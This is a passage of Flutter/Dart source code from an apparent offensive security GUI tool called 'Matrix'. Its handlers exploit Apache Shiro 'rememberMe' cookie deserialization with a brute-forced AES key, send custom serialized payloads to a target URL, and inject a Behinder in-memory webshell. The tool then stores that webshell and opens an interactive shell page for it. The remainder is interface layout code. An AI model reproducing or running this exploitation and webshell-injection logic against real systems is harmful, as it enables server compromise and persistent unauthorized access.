      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleSendPayload() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    final key = _currentKey;
    if (key == null) {
      _appendLog('[!] 请先爆破出 Key 或输入 Key');
      return;
    }

    setState(() => _running = true);

    try {
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );

      // 仅保留“自定义 Payload”模式
      var b64 = _payloadB64Controller.text.trim().replaceAll(RegExp(r'\s+'), '');
      if (b64.isEmpty) {
        _appendLog('[!] 请输入 Payload Base64');
        return;
      }
      if (b64.contains('%')) {
        b64 = Uri.decodeComponent(b64);
      }

      List<int> payload;
      try {
        payload = base64.decode(b64);
      } catch (e) {
        _appendLog('[!] Base64 解码失败: $e');
        return;
      }

      _appendLog('[*] 发送自定义 Payload，使用 Key：$key');
      final result = await svc.sendExploitOnce(
        keyBase64: key,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
      );
      final res = result.response;
      final code = res.statusCode;
      _appendLog('[+] 发送完成，HTTP: $code');
      if (res.body.trim().isNotEmpty) {
        final snippet = res.body.length > 500 ? '${res.body.substring(0, 500)}...' : res.body;
        _appendLog('[i] 响应体: $snippet');
      }
    } catch (e) {
      _appendLog('[!] 利用异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleInjectMemShell() async {
    final url = _urlController.text.trim();
    final key = _currentKey;
    if (url.isEmpty) { _appendLog('[!] 请输入目标 URL'); return; }
    if (key == null) { _appendLog('[!] 请先填入或爆破出 Key'); return; }

    final password = _memShellPasswordController.text.trim();
    final path = _memShellPathController.text.trim();
    if (password.isEmpty) { _appendLog('[!] 请输入冰蝎密码'); return; }
    if (path.isEmpty || !path.startsWith('/')) {
      _appendLog('[!] 路径须以 / 开头，例如 /shell.ico');
      return;
    }

    setState(() => _running = true);
    _appendLog('[*] 开始注入内存马 (${_memShellType.displayName})');
    _appendLog('[*] 密码: $password  路径: $path');

    try {
      final shellBytes = await _memShellService.buildShellClass(
        type: _memShellType,
        password: password,
        path: path,
      );
      _appendLog('[*] Shell 类修补完成（${shellBytes.length} bytes）');

      await _memShellService.inject(
        targetUrl: url,
        keyBase64: key,
        shellClassBytes: shellBytes,
        shellPath: path,
        shellPassword: password,
        mode: _encryptionMode,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(
            seconds: int.tryParse(_timeoutController.text.trim()) ?? 15),
        onProgress: _appendLog,
      );

      final base = Uri.parse(url);
      final baseUrl = base.replace(path: path, query: null).toString();
      final behinderPass = password;
      _appendLog('[i] 注入完成，内存 WebShell: $baseUrl  密码: $behinderPass');
      // 持久化到数据库并跳转到 Webshell 交互页
      if (mounted) {
        final now = DateTime.now();
        Webshell ws = Webshell(
          id: 0,
          projectId: 0,
          name: 'Shiro 内存马',
          url: baseUrl,
          password: behinderPass,
          type: 'jsp',
          method: 'POST',
          status: 1,
          connectorType: 'jsp_behinder',
          createdAt: now,
          updatedAt: now,
        );
        try {
          final db = DatabaseHelper();
          final projects = await db.getAllProjects();
          Project? project;
          if (projects.isNotEmpty) {
            project = await showDialog<Project>(
              context: context,
              builder: (ctx) => AlertDialog(
                backgroundColor: AppColors.bgCard,
                title: Text('选择项目', style: AppTextStyles.heading(color: AppColors.primary)),
                content: SizedBox(
                  width: 360,
                  child: ListView.builder(
                    shrinkWrap: true,
                    itemCount: projects.length,
                    itemBuilder: (ctx, i) {
                      final p = projects[i];
                      return ListTile(
                        leading: const Icon(Icons.folder_outlined,
                            color: AppColors.primary, size: 20),
                        title: Text(p.name,
                            style: AppTextStyles.body(
                                size: 13, color: AppColors.textPrimary)),
                        subtitle: Text(p.domain,
                            style: AppTextStyles.caption(
                                size: 11, color: AppColors.textMuted)),
                        onTap: () => Navigator.pop(ctx, p),
                      );
                    },
                  ),
                ),
                actions: [
                  TextButton(
                    onPressed: () => Navigator.pop(ctx),
                    child: Text('取消',
                        style: AppTextStyles.body(
                            color: AppColors.textSecondary)),
                  ),
                ],
              ),
            );
          }
          if (project != null) {
            ws = await db.createWebshell(
              project.id,
              name: 'Shiro 内存马',
              url: baseUrl,
              password: behinderPass,
              method: 'POST',
              type: 'jsp',
              connectorType: 'jsp_behinder',
            );
          }
        } catch (_) {}
        if (!mounted) return;
        Navigator.of(context).push(
          MaterialPageRoute(
            builder: (_) => WebshellInteractivePage(webshell: ws),
          ),
        );
      }
    } catch (e) {
      _appendLog('[!] 注入异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: AppColors.border),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: AppColors.primary.withValues(alpha: 0.12),
                  borderRadius: BorderRadius.circular(6),
                ),
                child: const Icon(Icons.cookie, color: AppColors.primary, size: 18),
              ),
              const SizedBox(width: 10),
              Text(
                'Shiro 反序列化',
                style: AppTextStyles.heading(
                  size: 14,
                  color: AppColors.textPrimary,
                ),
              ),
              const SizedBox(width: 12),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                decoration: BoxDecoration(
                  color: AppColors.cyan.withValues(alpha: 0.2),
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppColors.cyan.withValues(alpha: 0.5)),
                ),
                child: Text(
                  'Cookie: ${_cookieNameController.text.trim().isNotEmpty ? _cookieNameController.text.trim() : 'rememberMe'}',
                  style: AppTextStyles.caption(size: 10, color: AppColors.cyan),
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Expanded(
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                Flexible(
                  flex: 1,
                  child: ConstrainedBox(
                    constraints: const BoxConstraints(minHeight: 0, minWidth: 0),
                    child: SingleChildScrollView(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        mainAxisSize: MainAxisSize.min,
                      children: [
                        _shiroSectionTitle('目标配置'),
                        TextField(
                          controller: _urlController,
                          style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                          decoration: _shiroInputDecoration('目标 URL', 'https://target.com/login'),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Expanded(
                              child: DropdownButtonFormField<String>(
                                initialValue: _method,
                                isExpanded: true,
                                dropdownColor: AppColors.bgElevated,
                                icon: const Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                                style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                items: const [
                                  DropdownMenuItem(value: 'GET', child: Text('GET', overflow: TextOverflow.ellipsis)),
                                  DropdownMenuItem(value: 'POST', child: Text('POST', overflow: TextOverflow.ellipsis)),
                                ],
                                onChanged: (v) { if (v != null) setState(() => _method = v); },
                                decoration: _shiroInputDecoration('方法', ''),
                              ),
                            ),
                            const SizedBox(width: 8),
                            Expanded(
                              child: DropdownButtonFormField<ShiroEncryptionMode>(
                                initialValue: _encryptionMode,
                                isExpanded: true,
                                dropdownColor: AppColors.bgElevated,
                                icon: const Icon(Icons.arrow_drop_down, color: AppColors.textSecondary, size: 22),
                                style: AppTextStyles.body(size: 11, color: AppColors.textPrimary),
                                items: const [
                                  DropdownMenuItem(value: ShiroEncryptionMode.cbc, child: Text('AES-CBC', overflow: TextOverflow.ellipsis)),
                                  DropdownMenuItem(value: ShiroEncryptionMode.gcm, child: Text('AES-GCM', overflow: TextOverflow.ellipsis)),
                                ],
                                onChanged: (v) { if (v != null) setState(() => _encryptionMode = v); },
                                decoration: _shiroInputDecoration('模式', ''),
                              ),
                            ),
                            const SizedBox(width: 8),
                            Expanded(
                              child: TextField(
                                controller: _timeoutController,
                                style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                                decoration: _shiroInputDecoration('超时(s)', '10'),
                                keyboardType: TextInputType.number,
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Expanded(
                              child: Text(
                                '模式: 自定义 Payload（仅发送下方 Base64）',
                                style: AppTextStyles.caption(
                                  size: 11,
                                  color: AppColors.textSecondary,
                                ),
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        TextField(
                          controller: _cookieNameController,
                          onChanged: (_) => setState(() {}),
                          style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
                          decoration: _shiroInputDecoration('Cookie 名', 'rememberMe'),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Checkbox(
                              value: _verboseMode,
                              onChanged: (v) { if (v != null) setState(() => _verboseMode = v); },
                            ),
                            Text('详细日志', style: AppTextStyles.caption(size: 11)),
                          ],
                        ),
                        const SizedBox(height: 16),
                        _shiroSectionTitle('Key 与 Payload'),
                        TextField(
                          controller: _keyController,
                          onChanged: (_) => setState(() {}),
                          style: AppTextStyles.body(
                            size: 12,
                            color: _currentKey == null ? AppColors.textMuted : AppColors.cyan,
                          ),
                          decoration: _shiroInputDecoration('当前 Key', '爆破后自动填充').copyWith(
                            suffixIcon: _currentKey == null
                                ? const Icon(Icons.vpn_key_outlined, size: 16, color: AppColors.textSecondary)
                                : const Icon(Icons.check_circle, size: 16, color: AppColors.cyan),
                          ),
                        ),
                        const SizedBox(height: 8),
                        TextField(
                          controller: _payloadB64Controller,
                          maxLines: 4,
                          style: AppTextStyles.terminal(size: 11, color: AppColors.cyan),
                          decoration: _shiroInputDecoration('Payload Base64', '粘贴 Base64 编码的序列化 Payload'),
                        ),
                        const SizedBox(height: 8),
                        Wrap(
                          spacing: 8,
                          runSpacing: 8,
                          children: [
                            _shiroActionBtn('检测 Shiro', _handleCheckShiro),
                            _shiroActionBtn('爆破 Key', _handleBruteforce),
                            _shiroActionBtn('验证 Key', _handleVerifyKey, enabled: _currentKey != null),
                            _shiroActionBtn('发送 Payload', _handleSendPayload, enabled: _currentKey != null),
                          ],
                        ),
                        const SizedBox(height: 20),
                        _shiroSectionTitle('内存冰蝎马注入'),
                        const SizedBox(height: 4),
                        // Shell 类型选择
                        DropdownButtonFormField<MemShellType>(
                          initialValue: _memShellType,
                          isExpanded: true,
                          dropdownColor: AppColors.bgElevated,
                          icon: const Icon(Icons.arrow_drop_down,
                              color: AppColors.textSecondary, size: 22),
                          style: AppTextStyles.body(
                              size: 11, color: AppColors.textPrimary),
                          items: MemShellType.values
                              .map((t) => DropdownMenuItem(
                                    value: t,
                                    child: Text(t.displayName,
                                        overflow: TextOverflow.ellipsis),
                                  ))
                              .toList(),
                          onChanged: (v) {
                            if (v != null) setState(() => _memShellType = v);
                          },
                          decoration: _shiroInputDecoration('Shell 类型', ''),
                        ),
                        const SizedBox(height: 8),
                        Row(
                          children: [
                            Expanded(
                              child: TextField(
                                controller: _memShellPasswordController,
                                style: AppTextStyles.body(
                                    size: 12,
                                    color: AppColors.amber),
                                decoration:
                                    _shiroInputDecoration('冰蝎密码（16位HEX）', 'mAtrix_911'),
                              ),
                            ),
                            const SizedBox(width: 8),
                            Expanded(
                              child: TextField(
                                controller: _memShellPathController,
                                style: AppTextStyles.body(
                                    size: 12, color: AppColors.cyan),
                                decoration:
                                    _shiroInputDecoration('Shell 路径', '/shell.ico'),
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 6),
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: AppColors.primary.withValues(alpha: 0.05),
                            borderRadius: BorderRadius.circular(6),
                            border: Border.all(
                                color: AppColors.primary.withValues(alpha: 0.2)),
                          ),
                          child: Text(
                            '内置 CB1-InjectMemTool 链，无需手动填写 Payload。'
                            '服务端反序列化后读取 user 参数注入冰蝎内存马。',
                            style: AppTextStyles.caption(
                                size: 10, color: AppColors.textSecondary),
                          ),
                        ),
                        const SizedBox(height: 8),
                        _shiroActionBtn(
                          '注入内存马',
                          _handleInjectMemShell,
                          enabled: _currentKey != null,
                        ),
                      ],
                    ),
                  ),
                ),
                ),
                const SizedBox(width: 16),
                Flexible(
                  flex: 1,
                  child: ConstrainedBox(
                    constraints: const BoxConstraints(minHeight: 0, minWidth: 0),
                    child: Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: AppColors.bgDark,
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: AppColors.border),
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.stretch,
                        children: [
                          Row(
                            children: [
                              Container(
                                width: 6,
                                height: 6,
                                margin: const EdgeInsets.only(right: 6),
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  color: _running ? AppColors.primary : AppColors.textMuted,
                                ),
                              ),
                              Text(
                                _running ? '运行中' : '空闲',
                              style: AppTextStyles.caption(
                                size: 11,
                                color: _running ? AppColors.primary : AppColors.textSecondary,
                              ),
                            ),
                            const Spacer(),
                            TextButton.icon(
                              onPressed: _log.isEmpty ? null : () async {
                                final messenger = ScaffoldMessenger.of(context);
                                await Clipboard.setData(ClipboardData(text: _log));
                                messenger.showSnackBar(
                                  const SnackBar(content: Text('已复制到剪贴板'), duration: Duration(seconds: 1)),
                                );
                              },
                              icon: const Icon(Icons.copy, size: 14),
                              label: const Text('复制'),
                              style: TextButton.styleFrom(
                                foregroundColor: AppColors.textSecondary,
                                textStyle: const TextStyle(fontSize: 11),
                              ),
                            ),
                            TextButton.icon(
                              onPressed: _log.isEmpty ? null : () => setState(() => _log = ''),
                              icon: const Icon(Icons.clear_all, size: 14),
                              label: const Text('清空'),
                              style: TextButton.styleFrom(
                                foregroundColor: AppColors.textSecondary,
                                textStyle: const TextStyle(fontSize: 11),
                              ),
                            ),
                          ],
                        ),
                        const Divider(height: 1, color: AppColors.border),
                        const SizedBox(height: 4),
                        Expanded(
                          child: SingleChildScrollView(
                            controller: _logScrollController,
                            child: SelectableText.rich(
                              _shiroBuildLogRichText(_log),
                              style: AppTextStyles.terminal(size: 12, color: AppColors.textMuted),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _shiroSectionTitle(String title) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 6),
      child: Row(
        children: [
          Container(
            width: 3,
            height: 14,
            decoration: BoxDecoration(
              color: AppColors.primary.withValues(alpha: 0.6),
              borderRadius: BorderRadius.circular(2),
            ),
          ),
          const SizedBox(width: 8),
          Text(title, style: AppTextStyles.heading(size: 12, color: AppColors.textSecondary)),
        ],
      ),
    );
  }

  InputDecoration _shiroInputDecoration(String label, String hint) {
    return InputDecoration(
      labelText: label,
      hintText: hint,
      hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
      floatingLabelBehavior: FloatingLabelBehavior.always,
      isDense: true,
      contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
      border: OutlineInputBorder(borderRadius: BorderRadius.circular(8)),
      enabledBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: const BorderSide(color: AppColors.border),
      ),
      focusedBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(8),
        borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.6)),
      ),
    );
  }

  Widget _shiroActionBtn(String label, VoidCallback onPressed, {bool enabled = true}) {
    return SizedBox(
      height: 32,
      child: ElevatedButton(
        onPressed: (_running || !enabled) ? null : onPressed,
        style: ElevatedButton.styleFrom(
          textStyle: const TextStyle(fontSize: 11),
          padding: const EdgeInsets.symmetric(horizontal: 12),
        ),
        child: Text(label),
      ),
    );
  }

  Color _shiroLogLineColor(String line) {
    if (line.startsWith('[+]')) return AppColors.primary;
    if (line.startsWith('[!]')) return AppColors.red;
    if (line.startsWith('[-]')) return AppColors.textMuted;
    if (line.startsWith('[*]')) return AppColors.cyan;
    return AppColors.textSecondary;
  }

  TextSpan _shiroBuildLogRichText(String log) {
    if (log.isEmpty) {
      return TextSpan(text: '> 等待操作', style: TextStyle(color: AppColors.textMuted, fontFamily: 'Monaco'));
    }
    final lines = log.split('\n');
    final spans = <TextSpan>[];
    final baseStyle = AppTextStyles.terminal(size: 12, color: AppColors.textSecondary);
    for (var i = 0; i < lines.length; i++) {
      final line = lines[i];
      final color = _shiroLogLineColor(line);
      spans.add(TextSpan(
        text: line + (i < lines.length - 1 ? '\n' : ''),
        style: baseStyle.copyWith(
          color: color,
          fontWeight: line.startsWith('[+]') || line.startsWith('[!]') ? FontWeight.w600 : null,
        ),
      ));
    }
    return TextSpan(children: spans);
  }
}

class MenuItem {
  final IconData icon;
  final IconData selectedIcon;
  final String label;

  const MenuItem({
    required this.icon,
    required this.selectedIcon,
    required this.label,
  });
}

class _SidebarMenuItem extends StatelessWidget {
  final MenuItem item;
  final bool isSelected;
  final double expandProgress;
  final VoidCallback onTap;

  const _SidebarMenuItem({
    required this.item,
    required this.isSelected,
    required this.expandProgress,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    final labelOpacity = ((expandProgress - 0.3) / 0.5).clamp(0.0, 1.0);
    final horizontalPadding = 12.0 + expandProgress * 4.0;

    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 2),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: onTap,
          borderRadius: BorderRadius.circular(8),
          child: Container(
            padding: EdgeInsets.symmetric(
              vertical: 12,
              horizontal: horizontalPadding,
            ),
            decoration: BoxDecoration(
              color: isSelected ? AppColors.bgCard : Colors.transparent,
              borderRadius: BorderRadius.circular(8),
            ),
            child: Row(
              children: [
                Icon(
                  isSelected ? item.selectedIcon : item.icon,
                  size: 22,
                  color: isSelected ? AppColors.primary : AppColors.textSecondary,
                ),
                Expanded(
                  child: Opacity(
                    opacity: labelOpacity,
                    child: Padding(
                      padding: const EdgeInsets.only(left: 12),
                      child: Text(
                        item.label,
                        style: TextStyle(
                          color: isSelected
                              ? AppColors.primary
                              : AppColors.textSecondary,
                          fontSize: 14,
                          fontWeight:
                              isSelected ? FontWeight.w500 : FontWeight.normal,
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

/// 工作区内容区域
class _WorkspaceContent extends StatelessWidget {
  final String title;

  const _WorkspaceContent({required this.title});

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // 欢迎卡片
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: AppColors.bgCard,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: AppColors.primary.withValues(alpha: 0.5),
                width: 1,
              ),
              boxShadow: [
                BoxShadow(
                  color: AppColors.primary.withValues(alpha: 0.15),
                  blurRadius: 24,
                  spreadRadius: 0,
                ),
              ],
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  '> 欢迎使用 Matrix',
                  style: AppTextStyles.terminal(size: 22, color: AppColors.primary),
                ),
                const SizedBox(height: 8),
                Text(
                  '当前页面：$title · 开始您的工作吧',
                  style: AppTextStyles.body(size: 14, color: AppColors.textSecondary),
                ),
              ],
            ),
          ),
          const SizedBox(height: 24),
          // 快捷入口
          Text(
            '快捷入口',
            style: AppTextStyles.heading(size: 16, color: AppColors.primary),
          ),
          const SizedBox(height: 16),
          Row(
            children: [
              _QuickActionCard(
                icon: Icons.add_circle_outline,
                label: '新建',
                color: AppColors.primary,
              ),
              const SizedBox(width: 16),
              _QuickActionCard(
                icon: Icons.upload_file,
                label: '上传',
                color: AppColors.cyan,
              ),
              const SizedBox(width: 16),
              _QuickActionCard(
                icon: Icons.folder_open,
                label: '打开',
                color: AppColors.red,
              ),
            ],
          ),
          const SizedBox(height: 32),
          // 最近活动
          Text(
            '最近活动',
            style: AppTextStyles.heading(size: 16, color: AppColors.primary),
          ),
          const SizedBox(height: 16),
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: AppColors.bgCard,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: AppColors.border,
                width: 1,
              ),
            ),
            child: Column(
              children: List.generate(
                4,
                (index) => Padding(
                  padding: const EdgeInsets.symmetric(vertical: 12),
                  child: Row(
                    children: [
                      Container(
                        width: 40,
                        height: 40,
            decoration: BoxDecoration(
              color: AppColors.bgElevated,
              borderRadius: BorderRadius.circular(8),
              border: Border.all(
                color: AppColors.primary.withValues(alpha: 0.4),
                            width: 1,
                          ),
                        ),
                        child: Icon(
                          [Icons.edit, Icons.folder, Icons.insert_drive_file, Icons.share][index],
                          color: AppColors.primary,
                          size: 20,
                        ),
                      ),
                      const SizedBox(width: 16),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              '项目文件 ${index + 1}',
                              style: AppTextStyles.body(size: 14, color: AppColors.textPrimary),
                            ),
                            Text(
                              '${2 + index} 小时前',
                              style: AppTextStyles.caption(color: AppColors.textSecondary),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _QuickActionCard extends StatelessWidget {
  final IconData icon;
  final String label;
  final Color color;

  const _QuickActionCard({
    required this.icon,
    required this.label,
    required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return Expanded(
      child: Material(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(12),
        child: InkWell(
          onTap: () {},
          borderRadius: BorderRadius.circular(12),
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 20),
            decoration: BoxDecoration(
              color: AppColors.bgCard,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(
                color: AppColors.border,
                width: 1,
              ),
            ),
            child: Column(
              children: [
                Container(
                  width: 48,
                  height: 48,
                  decoration: BoxDecoration(
                    color: color.withValues(alpha: 0.15),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: color.withValues(alpha: 0.5),
                      width: 1,
                    ),
                  ),
                  child: Icon(icon, color: color, size: 24),
                ),
                const SizedBox(height: 12),
                Text(
                  label,
                  style: AppTextStyles.body(color: AppColors.textPrimary),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

/// 赛博风格点阵网格背景（静态，零性能消耗）
class _CyberGridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = AppColors.primary.withValues(alpha: 0.035)
      ..strokeWidth = 1;
    const spacing = 28.0;
    for (double x = 0; x < size.width; x += spacing) {
      for (double y = 0; y < size.height; y += spacing) {
        canvas.drawCircle(Offset(x, y), 1, paint);
      }
    }
  }

  @override
  bool shouldRepaint(_CyberGridPainter old) => false;
}
